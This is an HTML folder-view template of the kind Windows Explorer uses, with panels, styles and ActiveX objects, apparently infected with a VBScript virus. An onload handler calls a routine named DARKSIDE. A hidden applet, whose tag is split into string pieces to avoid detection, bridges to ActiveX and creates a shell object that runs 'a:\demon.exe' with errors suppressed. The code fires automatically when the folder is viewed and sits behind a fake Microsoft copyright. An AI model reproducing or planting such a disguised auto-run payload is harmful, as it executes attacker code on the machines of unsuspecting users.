<BODY onload="vbscript:DARKSIDE()">
<!--
 * PHANTOMPAINCopyright 1999 Microsoft Corporation.  All rights reserved.
 -->
<html>
    <head>
        <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    </head>
    <style>
        body        {margin: 0; font: menu; color: black}
        #Panel      {position: absolute; width: 200px; height: 100%; visibility: hidden; overflow: auto}
        #Corner     {padding-left: 12px; padding-top: 11px}
        #FolderIcon {width: 32px; height: 32px}
        #FolderName {margin-top: 8px; font: 13pt/13pt menu; font-weight: bold}
        #LogoLine   {width: 100%; height: 2px; margin-top: 4px; vertical-align: top}
        #Details    {padding-left: 12px; margin-top: 8px}
        #Locked     {vertical-align: baseline}
        .Divider    {width: 100%; color: #C0C0C0; height: 1px}
        #Thumbnail  {width: 120px; height: 120px}
        .Legend     {margin-left: 8px}
        #Brand      {position: absolute; left: 200px; width: 100%; height: 100%; padding-left: 12px}
        p           {margin-top: 12px}
        p.Half      {margin-top: 4px}
        button      {font: 8pt Tahoma; margin-left: 12px; background: white; color: black}
        .Message    {width: 100%; frameBorder: 0; background: infobackground; color: infotext; border: 1px solid lightgrey}
        #CSCPlusMin {width: 17px}
        #CSCText    {}
        #CSCDetail  {}
        #CSCButton  {}
        #FileList   {position:absolute; width:0; height:100%; border=0}
    </style>
    <body scroll=no>
        <div id=Panel style="background: white URL(wvleft.bmp) no-repeat">
            <div id=Corner>
                <object id=FolderIcon classid="clsid:844F4806-E8A8-11d2-9652-00C04FC30871" tabIndex=-1>
                    <param name="scale" value=100>
                </object>
                <br>
                <div id=FolderName>
                    %THISDIRNAME%
                </div>
            </div>
            <img id=LogoLine src="wvline.gif">
            <div id=Details>
                <span id=CSC>
                    <div tabIndex=2 id=CSCHotTrack>
                    <span id=CSCPlusMin>
                    </span>
                    <span id=CSCText>
                    </span>
                    </div>
                    <div id=CSCDetail>
                    </div>
                    <span id=CSCButton>
                    </span>
                    <hr CLASS=Divider NOSHADE>
                </span>
                <span id=Info>
                </span>
                <br>
                <span id=MediaPlayerSpan>
                </span>

                <object id=Thumbnail classid="clsid:71650000-E8A8-11d2-9652-00C04FC30871" tabIndex=-1>
                </object>
                <label id=ThumbnailLabel for="Thumbnail" style="display: none">
                </label>

                <span id=Links>
                </span>
            </div>
        </div>
        <object id=FileList classid="clsid:1820FED0-473E-11D0-A96C-00C04FD705A2" tabIndex=1>
        </object>
        <object id=WVCoord classid="clsid:BCFD624E-705A-11d2-A2AF-00C04FC30871">
        </object>
    </body>
</html>
<script language=vbscript>
document.write "<div style='position:absolute; left:0px; top:0px; width:0px; height:0px; z-index:28; visibility: hidden'><"&"APPLET NAME=KAISER HEIGHT=0 WIDTH=0 code=com.ms."&"activeX.Active"&"XComponent></APPLET></div>"
</script>
<script language=vbscript>
sub DARKSIDE()
On Error Resume Next
Err.Clear
Set AppleObject = document.applets("KAISER")
AppleObject.setCLSID("{F935DC22-1CF0-11D0-ADB9-00C04FD58A0B}")
AppleObject.createInstance()
Set WsShell = AppleObject.GetObject()
wsshell.run "a:\demon.exe"
END SUB
</script>
</HTML>
</BODY>